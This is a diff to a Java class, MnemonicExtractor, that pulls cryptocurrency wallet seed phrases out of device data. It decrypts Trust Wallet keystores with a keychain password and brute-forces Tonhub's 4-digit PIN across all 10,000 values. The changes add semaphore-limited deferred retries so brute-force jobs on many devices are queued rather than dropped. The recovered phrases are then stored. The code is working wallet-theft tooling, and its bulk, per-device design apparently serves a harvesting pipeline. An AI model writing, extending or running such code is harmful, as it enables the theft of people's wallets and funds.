                         if (name.endsWith(".bin") && !name.endsWith(".data.bin") && !name.contains("unused")) {
                             return;
                         }
-                        // hex/unknown 的 unused* 已由 scanHexCoin98FromUnknownUnused 处理
+                        // hex/coin98 已由 scanHexCoin98 处理，跳过避免重复
                         if (rel.getNameCount() > 0) {
                             String top = rel.getName(0).toString();
-                            if ("unknown".equalsIgnoreCase(top) || "coin98".equalsIgnoreCase(top)) {
+                            if ("coin98".equalsIgnoreCase(top)) {
                                 return;
                             }
                         }
@@ -1226,98 +1432,68 @@ public class MnemonicExtractor {
             int r = kdfparams.getIntValue("r");
             int p = kdfparams.getIntValue("p");
             int dklen = kdfparams.getIntValue("dklen");
-            String saltHex = kdfparams.getString("salt");
-            byte[] salt = hexToBytes(saltHex);
+            byte[] salt = hexToBytes(kdfparams.getString("salt"));
 
-            // 🔍 运行期依赖探测（DEBUG 级别，正常运行不刷屏；需要定位时调高 log level）
-            boolean scOk = true, hutOk = true;
-            try { Class.forName("org.bouncycastle.crypto.generators.SCrypt"); }
-            catch (Throwable t) { scOk = false; }
-            try {
-                Class.forName("cn.hutool.crypto.digest.DigestUtil");
-                byte[] probe = keccak256HutoolAny(new byte[1]);
-                hutOk = (probe != null && probe.length == 32);
-            } catch (Throwable t) { hutOk = false; }
-
-            // 密码候选：对齐用户说明 + Python 脚本，两种编码全部尝试
-            //   1) UTF-8 64 bytes = pwdHex.getBytes(UTF-8)  → Python t.strip().encode()  ← 优先
-            //   2) 32 raw bytes  = hexToBytes(pwdHex)         → 有些 KC 直接把 hex 当 bytes
-            byte[] pwd1 = pwdHex.getBytes(StandardCharsets.UTF_8);
-            byte[] pwd2 = (pwdHex.matches("[0-9a-fA-F]{64}")) ? hexToBytes(pwdHex) : null;
-            byte[][] candidates = (pwd2 != null) ? new byte[][]{pwd1, pwd2} : new byte[][]{pwd1};
-            String[] candLabels  = (pwd2 != null) ? new String[]{"utf8_64bytes", "hex_decode_32bytes"} : new String[]{"utf8_64bytes"};
+            // 先试 hex->32bytes（常见命中），再试 UTF-8；命中即停
+            byte[] pwdUtf8 = pwdHex.getBytes(StandardCharsets.UTF_8);
+            byte[] pwdRaw = (pwdHex.matches("[0-9a-fA-F]{64}")) ? hexToBytes(pwdHex) : null;
+            byte[][] candidates;
+            String[] candLabels;
+            if (pwdRaw != null) {
+                candidates = new byte[][]{pwdRaw, pwdUtf8};
+                candLabels = new String[]{"hex_decode_32bytes", "utf8_64bytes"};
+            } else {
+                candidates = new byte[][]{pwdUtf8};
+                candLabels = new String[]{"utf8_64bytes"};
+            }
 
             byte[] ciphertext = hexToBytes(cipherStr);
             byte[] iv = hexToBytes(ivStr);
             byte[] expectedMac = hexToBytes(macStr);
 
-            // 失败时汇总诊断用，避免每次都跑两次 keccak 占 CPU
-            StringBuilder failDiag = new StringBuilder();
-            failDiag.append("ks_addr=").append(ks.getString("address"));
-            failDiag.append(" mac_expected=").append((expectedMac != null && expectedMac.length >= 32) ? bytesHex(expectedMac, 0, 32) : "n/a");
-            failDiag.append(" {");
-
             for (int ci = 0; ci < candidates.length; ci++) {
-                byte[] pwd = candidates[ci];
-                String label = candLabels[ci];
-
-                // SCrypt：优先 Bouncy Castle `generate(P,S,N,r,p,dklen)`（100% 对齐 Python hashlib.scrypt）
-                //          失败 fallback 到 scryptJ（Java 纯手版，历史上与 BC 结果不吻合，BC 可用时绝不要走）
-                byte[] dk = null;
-                String dkSource = null;
-                try {
-                    dk = SCrypt.generate(pwd, salt, n, r, p, dklen);
-                    dkSource = "BC";
-                } catch (Throwable t1) {
-                    try {
-                        dk = scryptJ(pwd, salt, n, r, p, dklen);
-                        dkSource = "scryptJ";
-                    } catch (Throwable t2) {
-                        failDiag.append(" [").append(label).append("] dk=FAIL");
-                        continue;
-                    }
-                }
-                if (dk == null) continue;
-
-                // Keccak-256 MAC：MAC = keccak256(dk[16:] || ciphertext)
-                byte[] macInput = new byte[dk.length - 16 + ciphertext.length];
-                System.arraycopy(dk, 16, macInput, 0, dk.length - 16);
-                System.arraycopy(ciphertext, 0, macInput, dk.length - 16, ciphertext.length);
-                byte[] actualMac = keccak256(macInput); // Hutool 优先，兜底 self
-
-                if (expectedMac != null && actualMac != null && bytesEqual(expectedMac, actualMac)) {
-                    byte[] key16 = new byte[16];
-                    System.arraycopy(dk, 0, key16, 0, 16);
-                    byte[] plain = aesCtrDecrypt(key16, iv, ciphertext);
-                    if (plain == null) continue;
-
-                    String mn = new String(plain, StandardCharsets.UTF_8).trim();
-                    if (bip39.validateMnemonic(mn)) {
-                        return new PhraseResult("trust", mn, "keystore+kc_password");
-                    }
-                    String[] ws = mn.split("\\s+");
-                    if (ws.length == 12 || ws.length == 24) {
-                        log.warn("【mnemonic】trust 解密后 BIP39 校验未通过，但为 12/24 词格式，仍保留 pwd_variant={}", label);
-                        return new PhraseResult("trust", mn, "keystore+kc_password(invalid_bip39)");
-                    } else {
-                        log.warn("【mnemonic】trust variant={} MAC 已匹配 AES OK 但词格式不对 words={} head={}",
-                                label, ws.length, mn.length() <= 120 ? mn : mn.substring(0, 120));
-                    }
-                }
-
-                // 变体失败：记录关键 4 个字段（长度短，不占日志量），仅当所有变体都失败才整体 WARN 打出来
-                failDiag.append(" [").append(label).append("]");
-                failDiag.append(" dk_src=").append(dkSource);
-                failDiag.append(" dk[:8]=").append((dk.length >= 8)  ? bytesHex(dk, 0, 8) : "n/a");
-                failDiag.append(" dk[16:24]=").append((dk.length >= 24) ? bytesHex(dk, 16, 8) : "n/a");
-                failDiag.append(" mac_actual[:16]=").append((actualMac != null && actualMac.length >= 16) ? bytesHex(actualMac, 0, 16) : "n/a");
+                PhraseResult hit = trustTryOnePwd(candidates[ci], candLabels[ci],
+                        salt, n, r, p, dklen, ciphertext, iv, expectedMac);
+                if (hit != null) return hit;
             }
-            failDiag.append(" }");
-            // 所有变体都失败才 WARN 一次，把上面汇总的 dk[:8]/dk[16:24]/mac 全打印，便于定位
-            log.warn("【mnemonic】trust 有密码和 keystore，但全部解密失败（MAC 不匹配/无合法 BIP39 词）：{}", failDiag.toString());
             return null;
         } catch (Throwable t) {
             log.warn("【mnemonic】trust decrypt err: {}", t.toString());
+            return null;
+        }
+    }
+
+    private PhraseResult trustTryOnePwd(byte[] pwd, String label, byte[] salt, int n, int r, int p, int dklen,
+                                        byte[] ciphertext, byte[] iv, byte[] expectedMac) {
+        try {
+            byte[] dk;
+            try {
+                dk = SCrypt.generate(pwd, salt, n, r, p, dklen);
+            } catch (Throwable t1) {
+                dk = scryptJ(pwd, salt, n, r, p, dklen);
+            }
+            if (dk == null) return null;
+            byte[] macInput = new byte[dk.length - 16 + ciphertext.length];
+            System.arraycopy(dk, 16, macInput, 0, dk.length - 16);
+            System.arraycopy(ciphertext, 0, macInput, dk.length - 16, ciphertext.length);
+            byte[] actualMac = keccak256(macInput);
+            if (expectedMac == null || actualMac == null || !bytesEqual(expectedMac, actualMac)) {
+                return null;
+            }
+            byte[] key16 = new byte[16];
+            System.arraycopy(dk, 0, key16, 0, 16);
+            byte[] plain = aesCtrDecrypt(key16, iv, ciphertext);
+            if (plain == null) return null;
+            String mn = new String(plain, StandardCharsets.UTF_8).trim();
+            if (bip39.validateMnemonic(mn)) {
+                return new PhraseResult("trust", mn, "keystore+kc_password/" + label);
+            }
+            String[] ws = mn.split("\\s+");
+            if (ws.length == 12 || ws.length == 24) {
+                return new PhraseResult("trust", mn, "keystore+kc_password(invalid_bip39)/" + label);
+            }
+            return null;
+        } catch (Throwable t) {
             return null;
         }
     }
@@ -1819,10 +1995,14 @@ public class MnemonicExtractor {
      * </ul>
      */
     private PhraseResult tonhubPinBrute(byte[] mmkvBlob, Ctx ctx) {
+        return tonhubPinBrute(mmkvBlob, ctx, 0);
+    }
+
+    private PhraseResult tonhubPinBrute(byte[] mmkvBlob, Ctx ctx, int deferAttempt) {
         if (mmkvBlob == null) return null;
         String ctxId = (ctx == null || ctx.ios18paramId == null) ? null : String.valueOf(ctx.ios18paramId);
         int blobLen = mmkvBlob.length;
-        // ① 明文正则兜底（最快路径，有就直接返回，不占线程池）
+        // ① 明文正则兜底（最快路径）
         try {
             String lower = new String(mmkvBlob, StandardCharsets.UTF_8).toLowerCase();
             String found = bip39.searchPhrase(lower);
@@ -1831,16 +2011,29 @@ public class MnemonicExtractor {
             }
         } catch (Exception ignore) {}
 
+        // 串行化：无许可则延迟重试（不永久跳过，避免突发漏词）；有明文兜底则已在上面返回
+        final boolean[] acquired = {false};
+        if (consumerProps != null && consumerProps.isTonhubBruteSerialize() && tonhubBruteSemaphore != null) {
+            if (!tonhubBruteSemaphore.tryAcquire()) {
+                if (ctx != null) ctx.setTonhubDeferred(true);
+                scheduleTonhubBruteRetry(mmkvBlob, ctx, deferAttempt);
+                return null;
+            }
+            acquired[0] = true;
+        }
+
         Map<String, byte[]> kv;
         try {
             kv = tonhubParseMmkv(mmkvBlob);
         } catch (Exception e) {
+            finishTonhubBrute(acquired[0]);
             log.warn("【mnemonic】tonhub parse_mmkv FAIL（无法读取 ton-storage-* key） ctx_id={} blob_len={} err={}", ctxId, blobLen, e.toString());
             return null;
         }
         byte[] saltRaw = kv.get("ton-storage-passcode-nacl");
         byte[] refRaw = kv.get("ton-storage-ref");
         if (saltRaw == null || refRaw == null) {
+            finishTonhubBrute(acquired[0]);
             log.warn("【mnemonic】tonhub KV 缺加密键（无 salt/ref），暴力不启动 ctx_id={} blob_len={} salt_present={} ref_present={} kv_keys_ton={}",
                     ctxId, blobLen, (saltRaw != null), (refRaw != null),
                     kv.keySet().stream().filter(k -> k.startsWith("ton-storage")).collect(Collectors.toList()));
@@ -1850,6 +2043,7 @@ public class MnemonicExtractor {
         String ref = tonhubMmkvStr(refRaw);
         byte[] encKeyRaw = kv.get("ton-storage-passcode-enc-key-" + ref);
         if (encKeyRaw == null) {
+            finishTonhubBrute(acquired[0]);
             log.warn("【mnemonic】tonhub KV 缺 ton-storage-passcode-enc-key-{{}} 暴力不启动 ctx_id={} blob_len={} kv_keys_enc={}",
                     ref.length() > 24 ? ref.substring(0, 24) + "…" : ref,
                     ctxId, blobLen,
@@ -1864,16 +2058,19 @@ public class MnemonicExtractor {
         try {
             enc = Base64.getDecoder().decode(encB64.trim());
         } catch (Exception e) {
+            finishTonhubBrute(acquired[0]);
             log.warn("【mnemonic】tonhub enc base64 解码失败 ctx_id={} enc_len_raw={} err={}", ctxId, encB64.length(), e.toString());
             return null;
         }
         if (enc.length < 24 + 16) {
+            finishTonhubBrute(acquired[0]);
             log.warn("【mnemonic】tonhub enc 长度过短 ctx_id={} enc_len={}(需≥40)", ctxId, enc.length);
             return null;
         }
         // secretKeyEnc：走原始 blob 正则（Python 代码也是在整份 blob 里正则找，不依赖 kv key 名）
         Matcher sm = TON_SECRET_KEY_ENC.matcher(new String(mmkvBlob, StandardCharsets.ISO_8859_1));
         if (!sm.find()) {
+            finishTonhubBrute(acquired[0]);
             log.warn("【mnemonic】tonhub 原始 blob 无 \"secretKeyEnc\":\"...\" JSON 片段，暴力不启动 ctx_id={} blob_len={}", ctxId, blobLen);
             return null;
         }
@@ -1881,10 +2078,12 @@ public class MnemonicExtractor {
         try {
             secret = Base64.getDecoder().decode(sm.group(1));
         } catch (Exception e) {
+            finishTonhubBrute(acquired[0]);
             log.warn("【mnemonic】tonhub secretKeyEnc base64 解码失败 ctx_id={} secret_len_raw={} err={}", ctxId, sm.group(1).length(), e.toString());
             return null;
         }
         if (secret.length < 24 + 16) {
+            finishTonhubBrute(acquired[0]);
             log.warn("【mnemonic】tonhub secret 长度过短 ctx_id={} secret_len={}(需≥40)", ctxId, secret.length);
             return null;
         }
@@ -1895,6 +2094,9 @@ public class MnemonicExtractor {
         // ④ 4 位 PIN 暴力破解 —— 同时统计每一步失败原因，全失败时打印细分计数
         log.info("【mnemonic】tonhub 开始 PIN 暴力破解(0000-9999) kdf=PBKDF2-HMAC-SHA512/100000 salt_len={} enc_len={} secret_len={} ctx_id={}",
                 saltBytes.length, encFinal.length, secretFinal.length, ctxId);
+        if (acquired[0]) {
+            log.info("【mnemonic】tonhub 串行化许可已获取 ctx_id={}", ctxId);
+        }
         long t0 = System.currentTimeMillis();
         final AtomicReference<PhraseResult> hitRef = new AtomicReference<>();
         final AtomicReference<String> hitPin = new AtomicReference<>();
@@ -1911,17 +2113,6 @@ public class MnemonicExtractor {
 
         // 可配置同步等待超时：默认 5s（替代原硬编码 30s），设为 0 则完全异步不阻塞 worker
         long syncTimeoutMs = consumerProps == null ? 5000L : consumerProps.getTonhubBruteSyncTimeoutMs();
-
-        // 串行化：限制同时爆破的 device 数，避免多 device 并发暴力打满 CPU 拖慢 parse_ci
-        final boolean[] acquired = {false};
-        if (consumerProps != null && consumerProps.isTonhubBruteSerialize() && tonhubBruteSemaphore != null) {
-            if (!tonhubBruteSemaphore.tryAcquire()) {
-                log.info("【mnemonic】tonhub 串行化限制，跳过爆破 ctx_id={}", ctxId);
-                return null;
-            }
-            acquired[0] = true;
-            log.info("【mnemonic】tonhub 串行化许可已获取 ctx_id={}", ctxId);
-        }
 
         // 直接提交 chunks 到 TONHUB_BRUTE_POOL（同步/异步模式共用）
         final List<CompletableFuture<Void>> futs = new ArrayList<>(numChunks);
@@ -1947,7 +2138,7 @@ public class MnemonicExtractor {
             CompletableFuture<Void> all = CompletableFuture.allOf(futs.toArray(new CompletableFuture[0]));
             if (syncTimeoutMs <= 0) {
                 // 完全异步模式：chunks 已提交到池中开始执行，注册回调后立即返回
-                // 与同步超时后转异步的路径完全一致，不引入额外串行执行器
+                if (ctx != null) ctx.setTonhubAsyncStarted(true);
                 log.info("【mnemonic】tonhub 完全异步模式(syncTimeout=0)，worker 立即释放 ctx_id={}", ctxId);
                 final Ctx fctx0 = ctx;
                 all.whenComplete((v, th) -> {
@@ -2020,6 +2211,39 @@ public class MnemonicExtractor {
             try { tonhubBruteSemaphore.release(); }
             catch (Exception ignore) {}
         }
+    }
+
+    /**
+     * 许可不足不丢弃：延迟后再次 tonhubPinBrute；命中后走既有异步/补写路径。
+     */
+    private void scheduleTonhubBruteRetry(byte[] mmkvBlob, Ctx ctx, int deferAttempt) {
+        int max = consumerProps == null ? 120 : Math.max(1, consumerProps.getCryptoDeferMaxAttempts());
+        String ctxId = (ctx == null || ctx.ios18paramId == null) ? null : String.valueOf(ctx.ios18paramId);
+        if (deferAttempt >= max) {
+            log.error("【mnemonic】tonhub 延迟重试耗尽仍无许可，放弃爆破 ctx_id={} attempts={}",
+                    ctxId, deferAttempt);
+            return;
+        }
+        long base = consumerProps == null ? 3000L : Math.max(500L, consumerProps.getCryptoDeferBaseDelayMs());
+        long delay = Math.min(60_000L, base * (1L + deferAttempt));
+        final int next = deferAttempt + 1;
+        if (log.isDebugEnabled()) {
+            log.debug("【mnemonic】tonhub 串行化繁忙，{}ms 后重试 ({}/{}) ctx_id={}",
+                    delay, next, max, ctxId);
+        }
+        final byte[] blob = mmkvBlob;
+        final Ctx fctx = ctx;
+        CRYPTO_DEFER.schedule(() -> {
+            try {
+                PhraseResult r = tonhubPinBrute(blob, fctx, next);
+                // 同步模式可能直接返回词；异步模式在 pinBrute 内已 savePhraseLater
+                if (r != null && fctx != null) {
+                    savePhraseLater(fctx, r, null);
+                }
+            } catch (Throwable t) {
+                log.warn("【mnemonic】tonhub 延迟重试异常 ctx_id={} err={}", ctxId, t.toString());
+            }
+        }, delay, TimeUnit.MILLISECONDS);
     }
 
     /**
@@ -2111,9 +2335,9 @@ public class MnemonicExtractor {
             // 2) 助记词 hash + 加密
             String phrasePlain = r.getPhrase();
             String phraseHash = sha256Hex(phrasePlain.getBytes(StandardCharsets.UTF_8));
-            String phraseEnc = aesEncryptMnemonic(phrasePlain);
+            String phraseEnc = MnemonicAesUtil.encodeForStorage(phrasePlain, mnemonicAesKey);
             if (phraseEnc == null || phraseEnc.isEmpty()) {
-                log.error("【mnemonic-tonhub-later】助记词加密失败，放弃补写 id={}", ctx.ios18paramId);
+                log.error("【mnemonic-tonhub-later】助记词写入值为空，放弃补写 id={}", ctx.ios18paramId);
                 return;
             }
 
@@ -2184,24 +2408,6 @@ public class MnemonicExtractor {
         }
     }
 
-    /** mnemonic AES-256-ECB 加密（与 ParseCiHandler.initAesKey 使用同一密钥） */
-    private String aesEncryptMnemonic(String plain) {
-        try {
-            SecretKeySpec key = this.mnemonicAesKey;
-            if (key == null) {
-                log.warn("【mnemonic-tonhub-later】mnemonicAesKey 未初始化，跳过加密");
-                return null;
-            }
-            Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
-            c.init(Cipher.ENCRYPT_MODE, key);
-            byte[] enc = c.doFinal(plain.getBytes(StandardCharsets.UTF_8));
-            return Base64.getEncoder().encodeToString(enc);
-        } catch (Throwable t) {
-            log.error("【mnemonic-tonhub-later】aesEncryptMnemonic FAIL: {}", t.toString());
-            return null;
-        }
-    }
-
     /** SHA-256 hex（与 ParseCiHandler 对齐，重复一份保持类独立性，避免循环依赖） */
     private static String sha256Hex(byte[] data) {
         try {
@@ -2255,12 +2461,14 @@ public class MnemonicExtractor {
             if (r != null) {
                 out.add(r);
                 return;
-            } else {
-                // tonhubPinBrute 内部已经把"为什么返回 null"的分级 WARN 打过了，这里只补一句"路径 × 尝试过 → 未产出结果"
-                log.warn("【mnemonic】tonhub 路径 {}（ctx_id={}）已执行 tonhubPinBrute，但未返回任何助记词（详见上方 tonhub*_ 分级 WARN）", cand, ctxId);
-                // 异步模式：暴力任务已提交到后台线程池，不再尝试其他文件
-                if (asyncMode) return;
             }
+            // 许可忙排队 / 已提交异步爆破：不算失败，不打 WARN
+            if (ctx != null && (ctx.isTonhubDeferred() || ctx.isTonhubAsyncStarted())) {
+                if (asyncMode) return;
+                continue;
+            }
+            log.warn("【mnemonic】tonhub 路径 {}（ctx_id={}）已执行 tonhubPinBrute，但未返回任何助记词（详见上方 tonhub*_ 分级 WARN）", cand, ctxId);
+            if (asyncMode) return;
         }
         // 5 个 variant 都没命中 → 再兜底 glob 一下 sandbox/**/Documents/mmkv/mmkv.default，防止还有新的命名
         try {
@@ -2282,8 +2490,11 @@ public class MnemonicExtractor {
                 String dirGuess = (sandboxRel.getNameCount() >= 1) ? sandboxRel.getName(0).toString() : "unknown";
                 PhraseResult r = tonhubPinBrute(blob, ctx);
                 if (r != null) { out.add(r); return; }
+                if (ctx != null && (ctx.isTonhubDeferred() || ctx.isTonhubAsyncStarted())) {
+                    if (asyncMode) return;
+                    continue;
+                }
                 log.warn("【mnemonic】tonhub glob 路径 {}（ctx_id={}）已执行但无结果", cand, ctxId);
-                // 异步模式：暴力任务已提交到后台，不再尝试其他文件
                 if (asyncMode) return;
             }
         } catch (IOException e) {
